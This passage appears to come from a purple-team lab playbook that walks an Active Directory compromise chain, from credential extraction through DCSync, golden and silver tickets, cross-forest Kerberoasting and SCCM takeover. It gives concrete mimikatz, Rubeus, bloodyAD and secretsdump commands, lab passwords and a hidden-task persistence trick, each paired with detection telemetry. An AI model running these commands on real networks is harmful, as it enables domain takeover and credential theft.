| **Key telemetry** | Sysmon EID 10 (process access on lsass.exe), EID 1 (mimikatz process create), WinSec 4688 |
| **Script** | `attack-matrix/04-automation/linux/campaign-a/T035-mbr01-creds-ws01.sh` + `campaign-a-t035-mbr01-creds.ps1` |
| **Note** | `sekurlsa::logonpasswords` may fail if the GodPotato token lacks `SeDebugPrivilege`; `lsadump::sam` works because it reads the registry hive. |

#### 3.5A — Winlogon Registry (T1552.002) ⭐ BACKUP

| Field | Value |
|-------|-------|
| **Status** | ✅ Tested from ws01 — plaintext password extracted |
| **Att&ck** | T1552.002 (Unsecured Credentials: Registry) |
| **Technique** | Auto-logon credentials stored in plaintext in Winlogon registry keys |
| **What it does** | SYSTEM reads `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` — `DefaultUserName`, `DefaultPassword`, `DefaultDomainName` contain the auto-logon credentials in plaintext. |
| **Prerequisite** | SYSTEM on mbr01 + auto-logon configured (`06-member-services.yml`) |
| **Source machine** | `ws01` → SYSTEM on mbr01 |
| **Target machine** | mbr01 (`192.168.77.22`) |
| **Domain** | `cadre.local` (analyst_cloud is in root domain) |
| **Starting credential** | `analyst_t1` / `T13r_An@lyst!` (SQL auth) |
| **What it earns** | `CADRE\analyst_cloud:Cl0ud_An@lyst!` — plaintext domain credential |
| **RedStrike Intent** | — (registry read) |
| **State Output** | SET_STATE(creds.analyst_cloud.password = "Cl0ud_An@lyst!") |
| **Command** | `campaign-a-t035a-winlogon-creds.ps1` via `T035A-winlogon-creds-ws01.sh` |
| **Real-world classification** | Misconfiguration discovery. Reportable finding. Common in kiosks, shared workstations, lab environments. |
| **Key telemetry** | Sysmon EID 12/13 (registry read on Winlogon keys), then 4624 Type 3/10 when credential is used |
| **Playbook anchor** | `06-member-services.yml` — sets DefaultUserName, DefaultPassword, DefaultDomainName |
| **Script** | `attack-matrix/04-automation/linux/campaign-a/T035A-winlogon-creds-ws01.sh` |

#### 3.5G — Offensive DPAPI via Nemesis (T1555)

| Field | Value |
|-------|-------|
| **Status** | ✅ VERIFIED 2026-08-03 (end-to-end, updated SharpDPAPI 2026-02-02 build) — domain DPAPI backup key EXTRACTED via mimikatz `lsadump::backupkeys /export` on dc01 (WinRM, DA); **updated SharpDPAPI imports the PVK and decrypts cadre masterkeys** (Administrator `{07024635…}:624FE5B4…`, chief_command `{9cdd94c1…}:094F1372…`) → **real blobs decrypted on dc01**: Administrator Credential (WindowsLive PersistedCredential `DFBE70A7…`) + **Web Credentials Vault** (recovered `aes128`/`aes256` vault keys). The `Bad Version of provider` blocker was a **tool-version issue**, not a platform quirk. Tool: updated SharpDPAPI merged to ws01 `C:\Tools\ADTools\tools-2026\`. |
| **Att&ck** | T1555 (Credentials from Password Stores) |
| **Technique** | Nemesis 2.2+ automates DPAPI decryption chain — SYSTEM/user masterkeys → CNG keys → Chromium App-Bound encryption |
| **What it does** | SYSTEM on mbr01 extracts DPAPI masterkeys for `analyst_cloud` → Nemesis decrypts Chromium App-Bound cookies, saved RDP file credentials, Outlook cached creds, WiFi passwords. |
| **Prerequisite** | SYSTEM on mbr01 + `analyst_cloud` has previously saved credentials (browser, RDP file, WiFi profile). Empty profile = weak demo. |
| **Source machine** | `ws01` → SYSTEM on mbr01 |
| **Target machine** | mbr01 (`192.168.77.22`) |
| **What it earns** | Decrypted credentials from `analyst_cloud` profile — browser cookies, RDP saved passwords, WiFi PSKs |
| **RedStrike Intent** | — (Nemesis manual) |
| **State Output** | SET_STATE(creds.analyst_cloud.dpapi = <extracted>) |
| **Key telemetry** | Sysmon EID 1 (Nemesis.exe process create), EID 11 (file access to `%APPDATA%\Microsoft\Protect\`) |
| **Independent of LSASS protections** | DPAPI masterkeys live in `%APPDATA%\Microsoft\Protect\<SID>\` and SYSTEM hive — NOT in LSASS process memory. |
| **Tool** | [github.com/SpecterOps/Nemesis](https://github.com/SpecterOps/Nemesis) |

#### 3.5H — ctfmon.exe Password Extraction

| Field | Value |
|-------|-------|
| **Status** | ⚠️ Partial 2026-08-03 — ctfmon confirmed running in analyst_cloud session 1 (PID 7072). comsvcs MiniDump = 64KB stub (env — same as 3.5K); procdump not staged; typed-password prerequisite unconfirmed (no strings found in stub). |
| **Att&ck** | T1003 (OS Credential Dumping) |
| **Technique** | Typed passwords persist in `ctfmon.exe` memory after app close. Not protected by PPL. |
| **What it does** | SYSTEM dumps `ctfmon.exe` process memory via procdump. Typed passwords (PuTTY, WinSCP, MySQL, SSH) remain in memory minutes/hours after the application closes. |
| **Prerequisite** | SYSTEM on mbr01 + `analyst_cloud` has typed a password into CLI tools |
| **Source machine** | `ws01` → SYSTEM on mbr01 |
| **Target machine** | mbr01 (`192.168.77.22`) |
| **Limitation** | `analyst_cloud` must have typed a password. Auto-logon doesn't generate typed passwords. |
| **Key telemetry** | Sysmon EID 10 (process access on `ctfmon.exe`) |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |

#### 3.5I — Token Impersonation ❌

| Field | Value |
|-------|-------|
| **Status** | ❌ Failed — error 1346 (ERROR_NO_SUCH_LOGON_SESSION) |
| **Att&ck** | T1134 (Access Token Manipulation) |
| **Technique** | Steal token from `analyst_cloud`'s running process via Win32 API |
| **What it does** | PowerShell script using `OpenProcessToken → DuplicateTokenEx → ImpersonateLoggedOnUser` failed. Session isolation between SQL service (session 0) and `analyst_cloud` (session 1). |
| **Why it failed** | Not a Microsoft patch — session isolation. GodPotato's impersonated token also lacks `SeDebugPrivilege`. |
| **Decision** | Use 3.5A (Winlogon plaintext) or 3.5F (SAM dump) instead. |
| **RedStrike Intent** | — (token impersonation failed) |
| **State Output** | — |

#### 3.5B — Scheduled Task as analyst_cloud ❌ REJECTED AS EXECUTION WRAPPER (Rule 2)

| Field | Value |
|-------|-------|
| **Status** | ❌ Rejected for attack chain as an execution wrapper — **Rule 2 (no scheduled tasks to run commands)**. Valid ONLY as a Phase 5 persistence mechanism. |
| **Att&ck** | T1053.005 (Scheduled Task) |
| **Technique** | (Rejected form) SYSTEM creates a scheduled task running as `analyst_cloud` just to run a command/tool. |
| **Why rejected** | Real-world attackers do not create a scheduled task merely to execute a command — that is a lazy shortcut, not attack methodology. This campaign simulates real-world behavior. Scheduled tasks exist here only as **persistence** (Phase 5), e.g. the invisible-task variant below. |
| **Persistent variant (valid)** | Phase 5 persistence: create a scheduled task on the compromised host that survives reboot (e.g. hide it by deleting `HKLM\...\TaskCache\Tree\<task>\Security` → invisible to `schtasks/query`, Task Scheduler GUI, Autoruns). |
| **Prerequisite (persistence variant)** | SYSTEM on target + `SeBatchLogonRight` for the task principal (`06-member-services.yml`). |
| **Key telemetry** | WinSec 4698 (task create), 4699 (task run), 4624 TargetUserName=analyst_cloud; Sysmon EID 1 |
| **RedStrike Intent** | `schtasks.create` (persistence context only) |
| **State Output** | — (no state set for rejected wrapper use) |

#### 3.5C — RDP Interactive Session as analyst_cloud (T1021.001)

| Field | Value |
|-------|-------|
| **Status** | ✅ VERIFIED 2026-08-03 (prereqs — Rule 3): `wt035c-rdp-prereq.ps1` — mbr01 :3389 open; `CADRE\analyst_cloud` SMB IPC$ auth OK. Full `mstsc` Type-10 session / SharpHound `-c Session` = user practice |
| **Att&ck** | T1021.001 (Remote Services: Remote Desktop Protocol) |
| **Technique** | Full interactive RDP logon as `analyst_cloud` using extracted plaintext password |
| **What it does** | From `ws01`, `mstsc /v:192.168.77.22 /u:analyst_cloud /p:'Cl0ud_An@lyst!' /d:CADRE`. Cross-domain auth works via cadre.local ↔ child.cadre.local trust. Type 10 logon produces highest-fidelity SharpHound data (DCOM users, local group edges, sessions). |
| **Prerequisite** | `analyst_cloud` password (from 3.5A) + RDP firewall rule + `analyst_cloud` in Remote Desktop Users on mbr01 (`06-member-services.yml`) |
| **Source machine** | `ws01` |
| **Target machine** | mbr01 (`192.168.77.22`) |
| **Domain** | `cadre.local` → `child.cadre.local` (cross-domain auth via trust) |
| **Starting credential** | `CADRE\analyst_cloud` / `Cl0ud_An@lyst!` |
| **What it earns** | SharpHound session data; full SharpHound run with `-c All` (session + ACL + trust + local) |
| **RedStrike Intent** | `winrs.command` / `winrs.cmd` |
| **State Output** | SET_STATE(beachhead.mbr01.analyst_cloud_session = true) |
| **Key telemetry** | WinSec 4624 Type 10 (RemoteInteractive), 4624 Type 3; Sysmon EID 3 (TCP :3389); Endpoint network; Zeek RDP.log |
| **Compared to 3.5B** | 3.5B is non-interactive schtasks; 3.5C gives true desktop session, required for SharpHound `-c Session,LoggedOn` collections |

#### 3.5D — File Detonation (WT063-068)

| Field | Value |
|-------|-------|
| **Status** | ✅ Verified 2026-08-03 — SYSTEM dropped marker to `C:\Users\analyst_cloud\Downloads\wt035d-marker.txt` (content verified, cleaned); `quser` confirms analyst_cloud ACTIVE on console session 1 (autologon). Actual detonation (user opens file) = user practice (Rule 3). |
| **Att&ck** | T1204.002 (User Execution: Malicious File) |
| **Technique** | SYSTEM drops payload to `analyst_cloud`'s Downloads. Autologon session exists → user context available. |
| **What it does** | SYSTEM writes malicious file (LNK/CHM/EXE) to `C:\Users\analyst_cloud\Downloads\`. When `analyst_cloud` opens it, code runs in their context. Telemetry demo for initial access detection. |
| **Prerequisite** | SYSTEM on mbr01 + `analyst_cloud` autologon session |
| **What it earns** | Code exec as `analyst_cloud` (if user opens file) |
| **RedStrike Intent** | — (manual file detonation) |
| **State Output** | SET_STATE(c2_session.analyst_cloud = true) |
| **Key telemetry** | Sysmon EID 1 (process create), 11 (file create), 15 (file stream); Zeek http.log if download from Kali |

#### 3.5J — WMI Event Subscriptions (T1546.003)

| Field | Value |
|-------|-------|
| **Status** | ⚠️ Partial 2026-08-03 (env) — MOF compile creates filter+consumer+binding (5861 activation). BUT permanent-sub delivery never reaches consumer on Server 2025: `WITHIN` polling rejected (0x80041017 Invalid query), `TargetInstance ISA 'Win32_Process'` WHERE never matches, bare `__InstanceCreationEvent` works as TEMP sub only. Original staged script (WITHIN) was broken in this env. MOF is the correct creation primitive (Set-WmiInstance/CIM binding creation fails). |
| **Att&ck** | T1546.003 (Event Triggered Execution: WMI Event Subscription) |
| **Technique** | SYSTEM creates `__EventFilter` + `CommandLineEventConsumer` + `__FilterToConsumerBinding` |
| **What it does** | Fileless persistence: WMI subscription triggers payload on system uptime or other event. |
| **Prerequisite** | SYSTEM on mbr01 |
| **Source machine** | `ws01` → SYSTEM on mbr01 |
| **Target machine** | mbr01 (`192.168.77.22`) |
| **Key telemetry** | Sysmon 19 (WMI EventFilter), 20 (WMI EventConsumer), 21 (WMI FilterToConsumerBinding) |
| **Cleanup** | Remove filter/consumer/binding via WMI |
| **RedStrike Intent** | — (WMI subscription manual) |
| **State Output** | SET_STATE(persistence.wmi_subscription = <id>) |

#### 3.5K — LSASS Dump via WerFault (T1003.001)

| Field | Value |
|-------|-------|
| **Status** | ✅ VERIFIED 2026-08-03 (extraction) — procdump v12.01 `-ma lsass` → **62MB real full dump**; Rubeus dump (community 2.2.0) live-extracted analyst_cloud (CADRE) / MBR01$ / MSSQL$SQLEXPRESS / cross-domain tickets. Caveats: mimikatz 2.2.0 + pypykatz 0.3.15 can't parse Server 2025 LSASS; WerFault `-u -p -ip` produced no dump. T1003.001 objective achieved via procdump + Rubeus. |
| **Att&ck** | T1003.001 (OS Credential Dumping: LSASS Memory) |
| **Technique** | Microsoft-signed `WerFaultSecure.exe` triggers LSASS crash dump via Windows Error Reporting |
| **What it does** | Stealthier than procdump; trusted binary; not flagged by most EDR. |
| **Prerequisite** | SYSTEM on mbr01 |
| **Source** | `ws01` → SYSTEM on mbr01 |
| **Target** | mbr01 (`192.168.77.22`) |
| **Key telemetry** | Sysmon EID 1 (`WerFaultSecure.exe` with LSASS target), EID 11 (dump file creation) |
| **RedStrike Intent** | — (WerFault manual) |
| **State Output** | SET_STATE(creds.lsass_dump_path = <path>) |

#### 3.5L — LAPS Extraction (T1552.004)

| Field | Value |
|-------|-------|
| **Status** | ⏳ Not yet tested — LAPS extraction not exercised in this run |
| **Att&ck** | T1552.004 (Unsecured Credentials: Private Keys) |
| **Technique** | Extract LAPS password from AD attribute `ms-Mcs-AdmPwd` |
| **What it does** | LAPS manages unique local admin passwords per machine, stored in AD. If read permission is compromised, gives local admin on any LAPS-managed machine. |
| **Prerequisite** | Domain user with read permission on `ms-Mcs-AdmPwd` |
| **Source** | `ws01` as any domain user |
| **Target** | dc01 (`192.168.77.10`) — LDAP |
| **Command** | `Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd \| Select-Object Name, ms-Mcs-AdmPwd` |
| **Key telemetry** | WinSec 4662 (AD object access — reading LAPS password attribute); Sysmon EID 1 (LDAP query for LAPS attributes) |
| **RedStrike Intent** | — (LAPS read manual) |
| **State Output** | SET_STATE(creds.laps.<computer> = <password>) |

#### 3.5M — Azure AD Connect DPAPI Dump (T1555)

| Field | Value |
|-------|-------|
| **Status** | 🔬 Deferred 2026-08-03 — **AAD Connect NOT deployed** (no `ADSync` service on dc01; `sc query ADSync` → service does not exist). Defer to Plan 11 when AAD Connect is added. |
| **Att&ck** | T1555 (Credentials from Password Stores) |
| **Technique** | Extract MSOL account credentials stored using DPAPI on dc01 |
| **What it does** | `adconnectdump` extracts Cloud Sync agent credentials. Bridge from on-prem to Entra ID. |
| **Prerequisite** | SYSTEM on dc01 |
| **Source** | `ws01` → SYSTEM on dc01 (via Golden Ticket or DCSync-derived credential) |
| **Target** | dc01 (`192.168.77.10`) |
| **What it earns** | MSOL account credentials → pivot to Entra ID (Plan 11) |
| **RedStrike Intent** | — (adconnectdump manual) |
| **State Output** | SET_STATE(creds.msol = <extracted>) |
| **Key telemetry** | Sysmon EID 1 (`adconnectdump.exe`), file create events on MSOL credential files |
| **Tool** | [github.com/fox-it/adconnectdump](https://github.com/fox-it/adconnectdump) |

#### 3.5N — UnCanny LPE: Non-Admin → SYSTEM via InstallService (T1068, T1574.001)

| Field | Value |
|-------|-------|
| **Status** | 🔬 Deferred — gated on Developer Mode + playbook admin change |
| **Att&ck** | T1068 Exploitation for Privilege Escalation, T1574.001 Hijack Execution Flow (DLL Side-Loading) |
| **Technique** | Loose-file AppX registration with UNC `InstalledLocation` → SYSTEM `InstallService.exe` calls `LoadLibraryW(\attacker\share\InstallServicePlugin.dll)` |
| **What it does** | Direct SYSTEM from any standard user; bypasses existing EoP chain. |
| **Pre-conditions** | Developer Mode enabled on target; `InstallService.exe` + `AppXSvc` running; attacker SMB share with NTFS `FileSystemName` |
| **Source** | `ws01` as standard user |
| **Target** | mbr01, dc01, dc02, dc03, mbr02 |
| **Key telemetry** | Sysmon EID 1: `Add-AppxPackage -Register` with UNC path; EID 3: outbound SMB from `InstallService.exe`; Suricata SID:1000095-1000097 |
| **Tool** | [github.com/0xHossam/UnCanny](https://github.com/0xHossam/UnCanny) |
| **RedStrike Intent** | — (UnCanny LPE manual) |
| **State Output** | SET_STATE(beachhead.<target>.system = true) |

---

### Phase 4 — Discovery (BloodHound as analyst_cloud)

| Field | Value |
|-------|-------|
| **WT#** | 004 (BloodHound) |
| **Status** | ✅ Tested from ws01 via SYSTEM on mbr01 |
| **Stream** | Core AD |
| **Att&ck** | T1087 (Account Discovery), T1069 (Permission Groups Discovery), T1482 (Domain Trust Discovery) |
| **Technique** | SharpHound collection from a domain-joined context on mbr01 |
| **What it does** | Load BloodHound zip into BloodHound CE; run Cypher queries to identify attack paths (unconstrained delegation, ACL abuse, ADCS, GPO, sessions). |
| **Playbook** | `05-ad-attack-surface.yml` ACEs 1-26 = the surface BH discovers |
| **Prerequisite** | Authenticated AD bind as `analyst_cloud` (or SYSTEM with cross-domain auth) |
| **Source machine** | `ws01` → SYSTEM on mbr01 |
| **Target machine** | mbr01 (`192.168.77.22`) runs SharpHound; queries dc02/dc01 |
| **Domain joined?** | mbr01 is domain-joined (`child.cadre.local`) |
| **Domain** | `child.cadre.local` + `cadre.local` (cross-domain trust) |
| **Starting credential** | `CADRE\analyst_cloud` / `Cl0ud_An@lyst!` (from 3.5A) or SYSTEM on mbr01 |
| **What it earns** | Full BloodHound zip with sessions, ACLs, trusts, local groups, GPO, ADCS |
| **RedStrike Intent** | — (SharpHound manual) |
| **State Output** | SET_STATE(artifacts.bloodhound_zip = <path>) |
| **Command** | `campaign-a-t004-mbr01-bh.ps1` via `T004-mbr01-bh-ws01.sh` — runs `SharpHound.exe -c All -d child.cadre.local` as SYSTEM on mbr01, pulls zip back to `ws01` |
| **Alternative** | `SharpHound.exe -c DCOnly` from Kali (LDAP-only, no sessions) |
| **Key Cypher queries** | `MATCH (c:Computer {unconstraineddelegation:true}) RETURN c`; `MATCH (u:User)-[r:ForceChangePassword]->(t:User) RETURN p`; `MATCH (ct:CertTemplate) WHERE ct.requiresmanagerapproval=false RETURN ct` |
| **Key telemetry** | WinSec 4624 (LDAP bind), 4662 (LDAP query); Zeek ldap.log; Sysmon EID 1 (`SharpHound.exe`), 3 |
| **Script** | `attack-matrix/04-automation/linux/campaign-a/T004-mbr01-bh-ws01.sh` + `campaign-a-t004-mbr01-bh.ps1` |
| **Key findings** | `mbr01$` has `TrustedForDelegation = true` → leads to Phase 5 coercion; `hunter_dfir → chief_command: ForceChangePassword` → Branch A; ADCS templates → Branch B; `svc_sccm` SCCM Full Admin + SPN → Phase 8/Branch C; MSSQL linked server to linux01 → Branch D |

---

### Phase 5 — Lateral Movement (Coercion + Delegation)

| Field | Value |
|-------|-------|
| **Status** | ✅ VERIFIED 2026-07-31 — dc02 Spooler/RPC prerequisites configured; hostname listener used for Kerberos (IP listener falls back to NTLM, no TGT); `dc02$` TGT captured → kirbi→ccache → Phase 6 DCSync child/krbtgt. |
| **Stream** | Core AD |
| **Att&ck** | T1187 (Forced Authentication) + T1550.002 (Use Alternate Authentication Material: Kerberos) |
| **Technique** | Coerce `dc02$` to authenticate to `mbr01`, capture TGT via Rubeus monitor |
| **What it does** | `mbr01$` has `TrustedForDelegation = true`. Trigger PrinterBug from `mbr01` to `dc02$`; dc02 authenticates to mbr01; Rubeus captures the TGT. |
| **Playbook** | `05-ad-attack-surface.yml` — sets `TrustedForDelegation` on `mbr01$`; `04-vulnerabilities.yml` — enables Print Spooler on dc02 |
| **Prerequisite** | SYSTEM on mbr01 + Rubeus + SpoolSample + dc02 print spooler reachable |
| **Source machine** | `ws01` → SYSTEM on mbr01 |
| **Target machine** | dc02 (`192.168.77.11`) coerced to auth to mbr01 (`192.168.77.22`) |
| **Starting credential** | `analyst_t1` / `T13r_An@lyst!` (to reach mbr01) |
| **What it earns** | `dc02$` TGT → full child DC credential → DCSync rights |
| **RedStrike Intent** | `rubeus.asktgt` (after manual coercion) |
| **State Output** | SET_STATE(creds.dc02_machine.ticket = <path>) |
| **Step 1** | Stage `Rubeus.exe` and `SpoolSample.exe` on mbr01 from `ws01` via SMB (`C$`) |
| **Step 2** | Start `Rubeus.exe monitor /interval:5 /targetuser:dc02$ /nowrap` as SYSTEM on mbr01 |
| **Step 3** | Trigger `SpoolSample.exe dc02.child.cadre.local mbr01.child.cadre.local` as SYSTEM on mbr01 |
| **Step 4** | Collect captured TGT from monitor output |
| **Key telemetry** | WinSec 4662 (RPC); Zeek dce_rpc.log (opnum 1,65); Suri SID:1000050 (PrinterBug) |
| **Script** | `attack-matrix/04-automation/linux/campaign-a/T102-coerce-dc02-ws01.sh` + `campaign-a-t102-coerce-dc02.ps1` |
| **Status** | ✅ VERIFIED 2026-07-31 — dc02 Spooler/RPC prerequisites configured; hostname listener used for Kerberos (IP listener falls back to NTLM, no TGT); `dc02$` TGT captured → kirbi→ccache → Phase 6 DCSync child/krbtgt. |

#### Alternative Coercion Techniques

| WT# | Technique | Status | Notes |
|-----|-----------|--------|-------|
| WT017 | MS-RPRN PrinterBug | ✅ Confirmed (12 fires) | Works on Server 2025 |
| WT018 | MS-EFSR (PetitPotam) | ❌ Non-functional | `\PIPE\efsrpc` blocked on Server 2025 |
| WT019 | MS-DFSNM (DFSCoerce) | ❌ Non-functional | SMB-pipe DCE-RPC not detectable by Suricata 8.0.5 |
| WT020 | MS-FSRVP (ShadowCoerce) | ❌ Non-functional | Service not available on Server 2025 |
| WT096 | `coerce_plus` — consolidated | ⏳ Not tested — could be used once spooler is enabled on dc02 | NetExec module combining PrinterBug/DFSCoerce/MSEven/PetitPotam |
| WT094 | UnCanny Coerce (InstallService) | 🔬 Deferred | Requires Developer Mode |
| WT095 | Onelogon Zero-Channel | 🔬 Deferred | PoC expected Aug 2026 |

#### Alternative: RBCD (WT007)

| Field | Value |
|-------|-------|
| **WT#** | 007 |
| **Status** | ✅ VERIFIED 2026-07-31 — FakePC$ created via `addcomputer` + `bloodyAD` rbcd set on mbr01 → getST S4U2Proxy → SYSTEM on mbr01. (PowerView LDAP query from ws01 had a tooling quirk; the bloodyAD path is what verified.) |
| **Technique** | Resource-Based Constrained Delegation |
| **What it does** | Create fake computer, set RBCD on target, S4U2Proxy as DA |
| **Playbook** | N/A — RBCD abuse; requires GenericWrite on target computer |
| **Source** | `ws01` as compromised user |
| **Target** | mbr01 or other computer |
| **Command** | `bloodyAD --host dc02.child.cadre.local -u analyst_t1 -p 'T13r_An@lyst!' -d child.cadre.local add rbcd $TargetComputer$ $FakeComputer$` |
| **Key telemetry** | WinSec 4742 (computer account created), 4662 (RBCD write) |
| **Script** | `attack-matrix/04-automation/linux/campaign-a/T007-rbcd-ws01.sh` |
| **RedStrike Intent** | `rubeus.golden` |
| **State Output** | SET_STATE(creds.cadre_ea.ticket = <path>) |

#### Alternative: NTLM Relay (WT021-022)

| WT# | Technique | Status | Notes |
|-----|-----------|--------|-------|
| WT021 | NTLM Relay to LDAP (Shadow Credentials) | 🔬 Deferred | No SMB-authenticated coerce on Server 2025 (see ESC8 root cause) |
| WT022 | NTLM Relay to SMB | 🔬 Deferred | Same blocker as WT021/ESC8 |
| **Key telemetry** | WinSec 4624 (relayed); Zeek ldap.log / smb.log | | |
| **Script** | `T021-ntlmrelay-ldap-ws01.sh`, `T022-ntlmrelay-smb-ws01.sh` | | |

---

### Phase 6 — Privilege Escalation: DCSync (WT009)

| Field | Value |
|-------|-------|
| **WT#** | 009 |
| **Status** | ✅ Active (confirmed — 63 fires per testing) |
| **Stream** | Core AD |
| **Att&ck** | T1003.006 (DCSync via DRSUAPI) |
| **Technique** | MS-DRSR replication to extract domain secrets. |
| **What it does** | Replicate AD database from dc02 using `dc02$` TGT (from Phase 5) or any DA credential. |
| **ACE#** | 13+14 (eng_agentic → DC=cadre: Get-Changes + Get-Changes-All) — alternative misconfig |
| **Prerequisite** | DA credential or DCSync rights; use Kerberos TGT or NTLM |
| **Source machine** | `ws01` using `dc02$` TGT |
| **Target machine** | dc02 (`192.168.77.11`) |
| **Domain** | `child.cadre.local` |
| **Starting credential** | `dc02$` TGT from Phase 5 OR `child.cadre.local\Domain Admin` |
| **What it earns** | Child `krbtgt` + all user/computer hashes → **Domain Admin** of `child.cadre.local` |
| **RedStrike Intent** | `mimikatz.dcsync` |
| **State Output** | SET_STATE(creds.child_krbtgt.nt_hash = <extracted>) |
| **Command** | `Rubeus.exe ptt /ticket:<dc02$ TGT>` then `impacket-secretsdump 'child.cadre.local/dc02$@dc02.child.cadre.local' -k -no-pass` or `mimikatz # lsadump::dcsync /domain:child.cadre.local /user:krbtgt` |
| **Key telemetry** | WinSec 4662 (DS Replication); Sysmon EID 3; Zeek dce_rpc.log (DRSUAPI); Suri SID:1000002 (63 fires) |
| **Script** | `attack-matrix/04-automation/linux/campaign-a/T009-dcsync-ws01.sh` |
| **Note** | ✅ VERIFIED 2026-07-31 — as-written path (T102 dc02$ TGT → secretsdump `-k` → child/krbtgt) verified. |

---

### Phase 7 — Forest Trust Escalation (WT010-012)

| Field | Value |
|-------|-------|
| **Status** | ✅ Active |
| **Stream** | Core AD |
| **Att&ck** | T1134.005 (ExtraSids), T1558.001 (Golden Ticket), T1558.002 (Silver Ticket), T1558.003 (Kerberoasting) |
| **Technique** | Forge Kerberos tickets with child `krbtgt` and inject root `Enterprise Admins` SID via `ExtraSids` |
| **Playbook** | `00-domain-deploy.yml` — parent-child trust with SID filtering disabled (`SIDFilteringQuarantined = $false`) |
| **Prerequisite** | Child `krbtgt` + child SID + root Enterprise Admins SID (`S-1-5-21-<domain>-519`) |
| **Source machine** | `ws01` |
| **Target machine** | dc01 (`192.168.77.10`) — root DC / cadre.local |
| **Domain** | `child.cadre.local` → `cadre.local` |
| **Starting credential** | child `krbtgt` hash (from Phase 6 DCSync) |
| **What it earns** | Enterprise Admin in `cadre.local` → root domain compromise |
| **RedStrike Intent** | `rubeus.golden` |
| **State Output** | SET_STATE(creds.cadre_ea.ticket = <path>) |
| **Step 1** | `Rubeus.exe golden /user:Administrator /domain:child.cadre.local /sid:<child SID> /krbtgt:<child krbtgt hash> /sids:<root EA SID> /ticket:EA.kirbi` |
| **Step 2** | `Rubeus.exe ptt /ticket:EA.kirbi` |
| **Step 3** | `lsadump::dcsync /domain:cadre.local /user:krbtgt` |
| **Key telemetry** | WinSec 4624/4672 (EA logon); Zeek kerberos.log (cross-realm TGS) |
| **Script** | `attack-matrix/04-automation/linux/campaign-a/T010-golden-ws01.sh` (Golden), `T011-silver-ws01.sh`, `T012-diamond-ws01.sh` |
| **Note** | ✅ VERIFIED 2026-07-31 — mimikatz golden (child krbtgt + root EA SID) PTT verified, `EA-aes.kirbi` saved; Rubeus `golden` silent-fails on ws01 (use mimikatz). |

#### WT011 — Silver Ticket

| Field | Value |
|-------|-------|
| **Status** | ✅ VERIFIED 2026-08-03 — forged `cifs/mbr01.child.cadre.local` silver (MBR01$ NT `3a01c6cd…`, Administrator id:500 + group 512) via mimikatz `kerberos::golden /service`; **real-service proof** via impacket `smbclient.py -k` → `use c$` listed full mbr01 C$ (no KDC contact). Windows `dir` client falls back to NTLM (pre-existing session) — use impacket `-k` for explicit-ticket verification. |
| **Technique** | Forge service-specific TGS — no KDC contact |
| **Use case** | Target a specific service (e.g., `cifs/dc01.cadre.local`) after obtaining the service account NTLM hash |
| **Key telemetry** | No AS-REQ/AS-REP traffic; WinSec 4624 Type 3 with anomalous service ticket |
| **Script** | `T011-silver-ws01.sh` |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |

#### WT012 — Diamond Ticket

| Field | Value |
|-------|-------|
| **Status** | ⚠️ Partial 2026-08-03 (tool-compat) — real Rubeus (community 2.2.0, readable stack). Prereqs validated: legit TGT ✅ (AS-REQ), krbtgt AES256 ✅ (`d64da42f…` = WT010 golden key), service SPN ✅. Fork: AS-REQ path gets TGT then `Unable to decrypt ticket or get PAC` (Rubeus 2.2.0 PAC parser vs Server 2025 KDC); `/tgtdeleg` path arg-bug (hardcodes `cifs/dc.domain.com`) + fails over SSH. No newer prebuilt (GhostPack source-only). Reopen: compile Rubeus master (2.4.x). |
| **Technique** | Modify legit TGT rather than forge |
| **Use case** | Stealthier than Golden Ticket; requires `krbtgt` AES256 key + a valid TGT |
| **Key telemetry** | Legit TGT origin — fewer anomalies |
| **Script** | `T012-diamond-ws01.sh` |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |

---

### Phase 8 — Cross-Forest + External Domain (WT033-039)

| Field | Value |
|-------|-------|
| **Status** | ✅ Active — WT033 cross-forest Kerberoast verified from ws01; WT034 NAA extraction verified via `vault` share on `mbr02`; **WT037 CMPivot ✅ VERIFIED 2026-08-02** (live LogicalDisk data from WS01 via AdminService as svc_sccm); **WT039 script-as-SYSTEM ✅ VERIFIED 2026-08-02** (`ScriptOutput: nt authority\system` + on-disk markers on WS01). Enablers: svc_sccm granted Full Admin via DB (Takeover-1 primitive — it was never an RBAC admin), BGB fast channel restored (bgbisapi.msi → TCP 10123 up), script approval via DB `Scripts` table. Recipes in `docs/sccm-integration-guide.md` Phase 6B. |
| **Stream** | Core AD / Branch C |
| **Att&ck** | T1558.003 (Cross-forest Kerberoasting), T1213 (Data from Information Repositories), T1071 (Application Layer Protocol) |
| **Technique** | Use root domain `EA` rights to pivot across forest trust to `range.local` and abuse SCCM / delegations |
| **Playbook** | `00-domain-deploy.yml` — forest trust cadre.local ↔ range.local with SID filtering OFF |
| **Prerequisite** | Enterprise Admin in `cadre.local` (Phase 7) or equivalent cross-forest rights |
| **Source machine** | `ws01` with EA TGT |
| **Target machine** | dc03 (`192.168.77.12`) — root DC of `range.local`; mbr02 (`192.168.77.23`) — SCCM site |
| **Domain** | `cadre.local` → `range.local` |
| **Starting credential** | `cadre.local\Enterprise Admin` (Golden Ticket from Phase 7) |
| **What it earns** | `range.local` domain compromise; SCCM Full Admin (`svc_sccm`) |
| **RedStrike Intent** | `rubeus.kerberoast` (cross-forest) / `sharpsccm.get_naa` |
| **State Output** | SET_STATE(creds.svc_sccm.password = "s3rv1c3_SCCM!"; creds.svc_naa.password = "N@A_s3rv1c3!") |
| **Key commands** | Cross-forest Kerberoast `svc_sccm`; SCCM NAA extraction; SCCM site takeover |
| **Key telemetry** | WinSec 4624 cross-forest; Zeek kerberos.log cross-realm; SCCM logs |
| **Script** | `attack-matrix/04-automation/linux/campaign-a/T033-xforest-ws01.sh`, `T034-sccm-enum-ws01.sh`, `T035-sccm-pxe-boot-ws01.sh`, `T036-sccm-client-push-ws01.sh`, `T037-sccm-cmpivot-ws01.sh`, `T038-sccm-app-deploy-ws01.sh`, `T039-sccm-site-takeover-ws01.sh` |

#### WT033 — Cross-forest Kerberoast

| Field | Value |
|-------|-------|
| **Technique** | Kerberoast service accounts in `range.local` from `cadre.local` EA context |
| **Command** | `Rubeus.exe kerberoast /domain:range.local /dc:dc03.range.local /creduser:cadre\administrator /ticket:EA.kirbi ...` |
| **What it earns** | `svc_sccm` TGS → password → SCCM Full Admin |
| **RedStrike Intent** | — |
